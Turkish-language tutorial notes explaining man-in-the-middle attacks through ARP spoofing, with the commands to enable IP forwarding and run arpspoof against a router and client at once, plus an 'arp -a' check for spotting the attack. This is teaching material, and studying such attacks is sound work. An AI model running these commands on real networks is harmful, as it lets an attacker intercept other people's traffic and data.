## 🕵️‍♂️ Man in the Middle Saldırısı Nedir?
- Normalde sunucu ve client arasındaki iletişim şu şekilde olur:
	- 🧑‍💻 Client bir web sitesine istek yapar, bu isteği router'a iletir.
	- 📡 Router isteği ilgili web sitesine iletir, yanıtı alır.
	- 📬 Yanıtı alan router bu yanıtı client'e iletir.
---
- 🧑‍💻 Bu saldırı ile hacker şunu amaçlar:
	- Client bir web sitesine istek yapar, bu isteği router'a iletir.
	- 🕶️ Hacker kendini router gibi göstererek isteği alır ve router'a iletir.
	- Router isteği ilgili web sitesine iletir ve yanıtı alır.
	- 📬 Yanıtı alan router client'e iletir.
	- 🕶️ Hacker kendini client gibi göstererek yanıtı alır ve client'e iletir.
---
- Yani 🧑‍💻 kullanıcıya karşı router, 📡 router'a karşı kullanıcı gibi davranır.  
  Router ve kullanıcının tam ortasına girer ve böylece tüm web trafiği hacker'ın elinden geçer.  
  Böylece bu bilgilerin içeriğini görüntüleyebilir. 🔍
---
- Bu kandırma işlemi **🧬 ARP spoofing** ile yapılır.
	- 🧾 **ARP**, IP ve MAC adreslerinin eşleşmesini sağlayan bir protokoldür.  
	  Router tüm cihazlara **ARP request** göndererek "Bu IP kimin?" diye sorar.  
	  IP'ye sahip olan cihaz, **ARP reply** ile MAC adresini router'a gönderir.
	- ⚠️ **ARP request** gerekmeksizin **ARP reply** gönderilebilmesi sayesinde router kandırılabilir. (gerekli bilgiler netdiscover veya nmap ile elde edilebilir) 
	  Bu işleme **🎭 ARP spoofing** denir.

---

## 🎭 Arpspoof Aracı ile ARP Spoofing Yapmak

- 🛠️ Öncelikle **IP Forward** özelliği açılmalıdır:
  ```bash
  echo 1 > /proc/sys/net/ipv4/ip_forward
  ```
  📌 Bu komut ile sistem, gelen veriyi bir başka cihaza yönlendirebilir hâle gelir (değeri `1` olarak ayarlanır).

---

- 🔁 **Router'ı kandırmak için:**
  ```bash
  arpspoof -i <interface> -t <target router ip> <target client ip>
  ```

- 🔁 **Client'ı kandırmak için:**
  ```bash
  arpspoof -i <interface> -t <target client ip> <target router ip>
  ```

- 🧪 Bu iki komut **iki ayrı terminal** üzerinden **eşzamanlı** olarak çalıştırılmalıdır.

---

- 🧾 Kontrol etmek için hedef Windows bilgisayarda şu komut çalıştırılabilir:
  ```bash
  arp -a
  ```
- 📋 **ARP etkileşimi yapılan cihazların IP ve MAC adresleri** listelenir.

- ⚠️ Eğer cihaz ARP spoofing saldırısı altındaysa, **iki farklı IP adresinde aynı MAC adresi** görülür.
